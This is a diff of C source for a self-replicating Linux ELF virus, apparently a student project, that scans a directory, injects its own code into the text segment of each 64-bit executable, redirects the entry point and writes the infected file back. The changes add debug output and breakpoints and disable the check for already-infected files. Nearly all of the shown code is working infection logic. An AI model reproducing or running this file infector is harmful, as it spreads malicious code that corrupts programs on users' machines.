@@ -53,8 +53,8 @@ struct linux_dirent64 {
  char            *ft_strnstr(char *s1, char *s2, size_t n);
  int             ft_strcmp(const char *s1, const char *s2);
 
-#define PAGE_SIZE (4096 *3)
-
+#define PAGE_SIZE (0x4000)
+#define PAGE_SZ64 PAGE_SIZE
 # define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)\
 type name(type1 arg1,type2 arg2, type3 arg3)\
 {\
@@ -124,6 +124,7 @@ _start()
 	write(1,toto,2);
 	__asm__(".globl real_start\n"
 	        "real_start:\n"
+		 "int3\n"
 	        "call do_main\n");
 	exit(0);
 
@@ -245,23 +246,7 @@ bool process_runing(void)
 
 void	ft_putnbr(int nb)
 {
-	char min[12];
-	min[0] ='-';
-	min[1]='2';
-	min[2]='1';
-	min[3]='4';
-	min[4]='7';
-	min[5]='4';
-	min[6]='8';
-	min[7]='3';
-	min[8]='6';
-	min[9]='4';
-	min[10]='8';
-	min[11]=0;
-	if (nb == -2147483648)
-		ft_putstr(min);
-	else
-	{
+
 		if (nb < 0)
 		{
 			ft_putchar('-');
@@ -274,7 +259,6 @@ void	ft_putnbr(int nb)
 		}
 		else
 			ft_putchar((char)nb + 48);
-	}
 } // can be delete == debug
 int	ft_putchar(int c)
 {
@@ -628,8 +612,6 @@ int open_directory(char *path)
 	int dd,nread;
 	char buf[128];
 	char path_file[256];
-	t_file file;
-	int i = 0;
 	struct linux_dirent64 *d;
 	size_t len;
 
@@ -696,11 +678,13 @@ int open_directory(char *path)
 	getd[7] ='s';
 	getd[8] ='6';
 	getd[9] ='4';
+
 	getd[10] ='\n';
 	getd[11] =0;
 	ft_putstr(getd);
+	ft_putstr(getd);
 	//printf("getdents64\n");
-	nread = getdents64(dd, buf, 128);
+	;
 	char name_nread[8];
 	name_nread[0] ='n';
 	name_nread[1] ='r';
@@ -710,58 +694,64 @@ int open_directory(char *path)
 	name_nread[5] =' ';
 	name_nread[6] =':';
 	name_nread[7] = 0;
-	write(1,name_nread,7);
-	ft_putnbr(nread);
-	write(1,"\n",1);
-	//printf("nread %d\n",nread);
-	int c;
-	while (i < nread)
-	{
-		d = (struct linux_dirent64 *) (buf + i);
-		i += d->d_reclen ;
-		char host[7];
-		host[0]='h';
-		host[1] ='o';
-		host[2] ='s';
-		host[3] ='t';
-		host[4] =' ';
-		host[5] =':';
-		host[6] =0;
 
-		ft_putstr(host);
-		ft_putstr(d->d_name);
-		char type[7];
-		type[0] =' ';
-		type[1] ='t';
-		type[2] ='y';
-		type[3] ='p';
-		type[4] ='e';
-		type[5] =' ';
-		type[6] =0;
-		ft_putstr(type);
-		ft_putnbr(d->d_type);
-		ft_putchar('\n');
-		//printf("host %s type %d\n",d->d_name, d->d_type);
-		if (d->d_name[0] == '.')
-			continue;
-		len = ft_strlen(path);
-		ft_memmove(path_file,path,len);
-		path_file[len] = '/';
-		ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));
-		path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
-		ft_putstr(d->d_name);
-		ft_putchar(' ');
-		ft_putstr(path_file);
-		ft_putchar('\n');
-		//printf("%s %s\n",d->d_name,path_file);
-		struct stat st;
-		int fd = open (path_file, 0,0);
-		fstat(fd , &st);
-		char mem[st.st_size];
-		int c = read(fd, mem,st.st_size);
-		//write(1,mem,st.st_size);
-		do_the_job(mem,st.st_size,path_file);
+	ft_putnbr(nread);
+
+	//printf("nread %d\n",nread);
+	__asm__("int3");
+	int c;
+	int i;
+	while ((nread = getdents64(dd, buf, 128)) > 0)
+	{
+		for (i = 0 ; i < nread;)
+		{
+			ft_putchar('c');
+			d = (struct linux_dirent64 *) (buf + i);
+			i += d->d_reclen ;
+			char host[7];
+			host[0]='h';
+			host[1] ='o';
+			host[2] ='s';
+			host[3] ='t';
+			host[4] =' ';
+			host[5] =':';
+			host[6] =0;
+
+			ft_putstr(host);
+			ft_putstr(d->d_name);
+			char type[7];
+			type[0] =' ';
+			type[1] ='t';
+			type[2] ='y';
+			type[3] ='p';
+			type[4] ='e';
+			type[5] =' ';
+			type[6] =0;
+			ft_putstr(type);
+			ft_putnbr(d->d_type);
+			ft_putchar('\n');
+			//printf("host %s type %d\n",d->d_name, d->d_type);
+			if (d->d_name[0] == '.')
+				continue;
+			len = ft_strlen(path);
+			ft_memmove(path_file,path,len);
+			path_file[len] = '/';
+			ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));
+			path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
+			ft_putstr(d->d_name);
+			ft_putchar(' ');
+			ft_putstr(path_file);
+			ft_putchar('\n');
+			//printf("%s %s\n",d->d_name,path_file);
+			struct stat st;
+			int fd = open (path_file, 0,0);
+			fstat(fd , &st);
+			char mem[st.st_size];
+			int c = read(fd, mem,st.st_size);
+			//write(1,mem,st.st_size);
+			do_the_job(mem,st.st_size,path_file);
 			exit(4);
+		}
 	}
 	close(dd);
 	return 0;
@@ -793,12 +783,11 @@ int do_the_job(char buff[],size_t size, char *path)
 	Elf64_Ehdr          *header;
 	Elf64_Phdr*             seg;
 	Elf64_Shdr*             sec;
-	unsigned int parasite_size = ((char *)&myend - (char *)&real_start )+ 7;
-
-	Elf64_Addr text;
+	unsigned int payload_len = ((char *)&myend - (char *)&real_start )+ 7;
+ft_putnbr(payload_len);
+ft_putchar('\n');
 	Elf64_Addr parasite_vaddr;
 	Elf64_Addr old_e_entry;
-	Elf64_Addr end_of_text;
 	int text_found = 0;
 	int i;
 	char ono[3];
@@ -811,30 +800,10 @@ int do_the_job(char buff[],size_t size, char *path)
 	ft_putchar('\n');
 	if (size < sizeof(Elf64_Ehdr) || ft_strncmp(buff, ELFMAG,SELFMAG) || buff[EI_CLASS] != ELFCLASS64)
 	{
-		char ret[10];
-		ret[0] ='r';
-		ret[1] ='e';
-		ret[2] ='t';
-		ret[3] ='u';
-		ret[4] ='r';
-		ret[5] ='n';
-		ret[6] =' ';
-		ret[7] = '1';
-		ret[8] ='\n';
-		ret[9] =0;
-		ft_putstr(ret);
 		return (1);
 	}
-	char one_one[5];
-	one_one[0] ='1';
-	one_one[1] ='.';
-	one_one[2] ='1';
-	one_one[3] ='\n';
-	one_one[4] =0;
-	ft_putstr(one_one);
-
 	header = (Elf64_Ehdr *)buff;
-	 if(is_infected(buff))
+	 if(0 && is_infected(buff))
 	 {
 	 	char deja[15];
 	 	deja[0]='d';
@@ -857,62 +826,57 @@ int do_the_job(char buff[],size_t size, char *path)
 
 	 }
 
-	 ft_putchar('2');
-	 ft_putchar('\n');
+	Elf64_Ehdr* hdr;
+	Elf64_Phdr* phdr;
+	Elf64_Shdr* shdr;
+	Elf64_Addr entry, payload_vaddr, text_end;
 
-	//Recupere le premier segement TEXT on lui rajoute 4096
-	//puis on rajoute a tous les segment suivant 4096
-	seg = (Elf64_Phdr*)(buff + header->e_phoff);
-	for (i = header->e_phnum; i-- > 0; seg++)
-	{
-		if (text_found)
-		{
-			//printf("seg-.p_vaddr %llx p_offset before %llx",seg->p_vaddr, seg->p_offset);
-			seg->p_offset += PAGE_SIZE;
-			//printf(" after %llx\n",seg->p_offset);
-			continue;
-		}
-		else
-		if (seg->p_type == PT_LOAD)
-		{
-			if (seg->p_flags == (PF_R | PF_X))
+
+	// Get the elf_header
+	hdr = (Elf64_Ehdr*) buff;
+
+	// Get some value from the elf_hdr
+	entry = hdr->e_entry;
+	phdr = (Elf64_Phdr*) (buff + hdr->e_phoff);
+	shdr = (Elf64_Shdr*) (buff + hdr->e_shoff);
+
+	// Increase section header offset by PAGE_SIZE
+	hdr->e_shoff += PAGE_SZ64;
+
+	for(int i=0; i < hdr->e_phnum; i++){
+		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_X)){
+			//puts("text found");
+			text_end = phdr[i].p_offset + phdr[i].p_filesz;
+
+			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
+			old_e_entry = hdr->e_entry;
+			hdr->e_entry = payload_vaddr + 63;
+			phdr[i].p_filesz += PAGE_SZ64;
+			phdr[i].p_memsz += PAGE_SZ64;
+
+			for(int j=i+1; j < hdr->e_phnum; j++)
 			{
-				//seg->p_flags |= PF_W;
+				phdr[j].p_offset += PAGE_SZ64;
 
-				text = seg->p_vaddr;
-				parasite_vaddr = seg->p_vaddr + seg->p_filesz;
-
-				old_e_entry = header->e_entry;
-				header->e_entry = parasite_vaddr + 64;
-				end_of_text = seg->p_offset + seg->p_filesz;
-				seg->p_filesz += parasite_size;
-				seg->p_memsz += parasite_size;
-				text_found++;
-				ft_putnbr(parasite_vaddr);
-				ft_putchar('\n');
-				ft_putnbr(end_of_text);
 			}
+
+			break;
 		}
 	}
-	ft_putchar('3');
-	ft_putchar('\n');
 
-	sec = (Elf64_Shdr*)(buff + header->e_shoff);
-
-	for (i = header->e_shnum; i-- > 0; sec++)
-	{
-		//printf("section %llx\n",sec->sh_offset);
-		if (sec->sh_offset >= end_of_text)
-			sec->sh_offset += PAGE_SIZE;
-		else
-		if (sec->sh_size + sec->sh_addr == parasite_vaddr)
+	for(int i=0; i < hdr->e_shnum; i++){
+		if(shdr[i].sh_offset > text_end)
 		{
-			sec->sh_size += parasite_size;
-			//sec->sh_size += PAGE_SIZE;
+			shdr[i].sh_offset += PAGE_SZ64;
+
 		}
+
+		else if(shdr[i].sh_addr + shdr[i].sh_size == payload_vaddr)
+			shdr[i].sh_size += payload_len;
 	}
-	header->e_shoff += PAGE_SIZE;
-	new_file(buff,size,end_of_text, path,old_e_entry);
+	ft_putchar('4');
+	ft_putchar('\n');
+	new_file(buff,size,text_end, path,old_e_entry);
 	char fin[5];
 	fin[0] ='f';
 	fin[1]='i';
@@ -970,7 +934,7 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 {
 	int fd;
 	char tmp[125];
-	unsigned int parasite_size = ((char *)&myend - (char *)&real_start )+ 7;
+	unsigned int parasite_size = ((char *)&myend - (char *)&real_start ) + 7;
 	char jmp_code[7];
 
 	jmp_code[0] = '\x68'; /* push */
@@ -983,154 +947,102 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 
 	*(unsigned long *) &jmp_code[1] = old_e_entry; //fait supprimer tmp
 
-	char new_debut [16];
+	char new_debut [4];
 	new_debut[0] ='n';
 	new_debut[1] ='e';
 	new_debut[2] ='w';
-	new_debut[3] ='_';
-	new_debut[4] ='f';
-	new_debut[5] ='i';
-	new_debut[6] ='l';
-	new_debut[7] ='e';
-	new_debut[8] =' ' ;
-	new_debut[9] ='d';
-	new_debut[10] ='e';
-	new_debut[11] ='b';
-	new_debut[12] ='u';
-	new_debut[13] ='t';
-	new_debut[14] =' ' ;
-	new_debut[15] =0;
-	ft_putstr(new_debut);
+	new_debut[3] ='\n';
+	write(1,new_debut,4);
 
 	for (int i = 0; i< 125;i++)
 		tmp[i] = 0;
+
+
 	ft_memmove(tmp,path,ft_strlen(path));
 	ft_memmove(only_name(tmp) + 1,only_name(tmp), ft_strlen(only_name(tmp)));
 	*only_name(tmp) = '.';
 	ft_putstr(tmp);
 	ft_putchar('\n');
+
 	if ((fd = open (tmp, 0x242, 0755)) < 0)
 	{
-		char error[14];
+		char error[3];
 		error[0] ='e';
 		error[1] ='r';
 		error[2] ='r';
-		error[3] ='o';
-		error[4] ='r';
-		error[5] =' ' ;
-		error[6] ='o';
-		error[7] ='p';
-		error[8] ='e';
-		error[9] ='n';
-		error[10] =' ' ;
-		error[11] ='f';
-		error[12] ='d';
-		error[13] =0;
-		ft_putstr(error);
+		write(2,error,3);
 		return ;
 	}
 	ft_putstr(new_debut);
+	ft_putchar('\n');
+
+	ft_putnbr(end_of_text);
+
+	ft_putchar('\n');
+	ft_putnbr(fd);
+
+	ft_putchar('\n');
+
 	write(fd,buf, end_of_text);
 
 
-
-
+	ft_putchar('5');
+	ft_putchar('\n');
 	unsigned long address_of_start = get_eip() - ((char *)&yeah - (char *)&real_start);
 	unsigned long address_of_start_encrypt = get_eip() - ((char *)&yeah - (char *)&main_encrypt);
 
 	size_t size_wrote = 0;
+	ft_putchar('6');
+	ft_putchar('\n');
 	size_wrote =	put_sig(fd);
 
-	char fwe[14];
-	fwe[0]='s';
-	fwe[1] ='i';
-	fwe[2] ='z';
-	fwe[3] ='e';
-	fwe[4] =' ' ;
-	fwe[5] ='w';
-	fwe[6] ='r';
-	fwe[7] ='o';
-	fwe[8] ='t';
-	fwe[9] ='e';
-	fwe[10] =' ' ;
-	fwe[11] =':';
-	fwe[12] =' ' ;
-	fwe[13] =0;
-	ft_putstr(fwe);ft_putnbr(size_wrote);ft_putchar('\n');
+	ft_putchar('7');
+	ft_putchar('\n');
+	ft_putnbr(size_wrote);
+	ft_putchar('\n');
 
-	// size_wrote += write(fd,"\xcc",1);
-	size_wrote += write(fd,(char *) address_of_start, address_of_start_encrypt - address_of_start);//parasite_size - 7);
-	size_wrote += crypter(address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , 56, fd);
+	 //size_wrote += write(fd,"\xcc",1);
+	ft_putchar('8');
+	ft_putchar('\n');
+	size_wrote += write(fd,(char *) address_of_start, parasite_size - 7);
+	//size_wrote += crypter(address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , 56, fd);
+	ft_putchar('9');
+	ft_putchar('\n');
 	size_wrote += write(fd,jmp_code,7);
-
+	ft_putchar('1');ft_putchar('0');
+	ft_putchar('\n');
+	ft_putnbr(size_wrote); ft_putchar(' ');ft_putnbr(PAGE_SIZE); ft_putchar('\n');
 	for (int i = 0; i< PAGE_SIZE - size_wrote ;i++)
 		write(fd,"j",1);
-
+	ft_putchar('1');ft_putchar('1');
+	ft_putchar('\n');
 	write(fd,buf + end_of_text, size - end_of_text);
-
+	ft_putchar('1');ft_putchar('2');
+	ft_putchar('\n');
 	//lseek(fd, end_of_text, SEEK_SET);
 
-	char old[11] ;
+	char old[4] ;
 	old[0] ='o';
 	old[1] ='l';
 	old[2] ='d';
 	old[3] =' ' ;
-	old[4] ='e';
-	old[5] ='n';
-	old[6] ='t';
-	old[7] ='r';
-	old[8] ='y';
-	old[9] =' ' ;
-	old[10] =0;
-	ft_putstr(old);
+	ft_putchar('1');ft_putchar('3');
+	ft_putchar('\n');
+	write(1,old,4);
+	ft_putchar('1');ft_putchar('4');
+	ft_putchar('\n');
 	ft_putnbr(old_e_entry);
 	ft_putchar('\n');
 	//write(fd,needle, 62);
 
 	char para[16];
-	para[0] ='p';
-	para[1] ='a';
-	para[2] ='r';
-	para[3] ='a';
-	para[4] ='z';
-	para[5] ='i';
-	para[6] ='t';
-	para[7] ='e';
-	para[8] =' ' ;
-	para[9] ='s';
-	para[10] ='i';
-	para[11] ='z';
-	para[12] ='e';
-	para[13] =' ' ;
-	para[14] =':';
-	para[15] =0;
-
-	ft_putstr(para);
+	para[0] ='s';
+	para[1] ='i';
+write(1,para,2);
 	ft_putnbr(parasite_size);
 	ft_putchar('\n');
 
-	char name_tmp[6];
-	name_tmp[0]='t';
-	name_tmp[1] ='m';
-	name_tmp[2] ='p';
-	name_tmp[3] =' ';
-	name_tmp[4] ='\'';
-	name_tmp[5] =0;
-	char name_path[9];
-	name_path[0] = '\'';
-	name_path[1] =' ';
-	name_path[2] ='p';
-	name_path[3] ='a';
-	name_path[4] ='t';
-	name_path[5] ='h';
-	name_path[6] =' ';
-	name_path[7] ='\'';
-	name_path[8] =0;
-	ft_putstr(name_tmp);
-	ft_putstr(tmp);
-	ft_putstr(name_path);
-	ft_putstr(path);
-	ft_putchar('\n');
+
 	//printf("tmp %s, path %s\n",tmp, path);
 	close(fd);
 
@@ -1141,15 +1053,7 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	name_renam[1] ='i';
 	name_renam[2] ='n';
 	name_renam[3] =' ';
-	name_renam[4] ='r';
-	name_renam[5] ='e';
-	name_renam[6] ='n';
-	name_renam[7] ='a';
-	name_renam[8] ='m';
-	name_renam[9] ='e';
-	name_renam[10] =' ';
-	name_renam[11]  =0;
-	ft_putstr(name_renam);
+	write(1,name_renam,4);
 	ft_putnbr(ret);
 	ft_putchar('\n');
 
@@ -1406,7 +1310,7 @@ size_t crypter(char *read, size_t size, char key, int fd)
 	char tab[2];
 	tab[0]=0;
 	tab[1]=0;
-
+size_t i ;
 	if(size)
 	{
 		i = 0;
